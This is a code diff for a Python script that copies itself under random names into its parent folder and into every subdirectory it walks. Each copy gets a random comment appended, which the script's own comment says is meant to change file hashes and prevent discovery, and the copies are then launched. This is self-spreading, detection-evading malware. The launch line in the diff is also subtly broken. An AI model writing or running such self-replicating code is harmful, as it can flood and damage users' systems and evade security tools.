@@ -16,44 +16,44 @@ import sys
 import random
 import string
 
+def writeIntoFile(file, lines):
+    count = len(lines)
+    start = 0
+    for line in lines:
+        start = start + 1
+        # we dont want to copy the random string added to the end
+        if start == (count - 1):
+            break
+        file.write(line)
+
+def runFunc(filename):
+    os.system('python3 ' + filename)
+
 #get the current file
 thisfile = os.path.basename(__file__)
+directory = os.getcwd()
 
 #open up the file and read it
 f = open(thisfile, "r")
 lines = f.readlines()
+f.close()
 
 #Create the new file and include a different name
 filename = "newpython{randomness}.py".format(randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
 
 #start copying the contents of the files to the new one
-g = open(filename, "w")
 h = open("..\\" + filename, "w")
-count = len(lines)
-start = 0
-for line in lines:
-    start = start + 1
-    #we dont want to copy the random string added to the end
-    if start == (count - 1):
-        break
-    g.write(line)
-    h.write(line)
-
-#add the string at the end to change hash files and prevent discovery
-g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+writeIntoFile(h, lines)
 h.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
-
-#always closing everything
 h.close()
-g.close()
-f.close()
 
-#run the newly created file
-def runFunc():
-    os.system('python3 ' + filename)
-
-thread = Thread(target=runFunc)
-thread.start()
+for x in os.walk(directory):
+    g = open(x[0] + "/" + filename, "w")
+    writeIntoFile(g, lines)
+    g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+    g.close()
+    thread = Thread(target=runFunc(g))
+    thread.start()
 
 #Ensure this thread gets closed
 sys.exit()
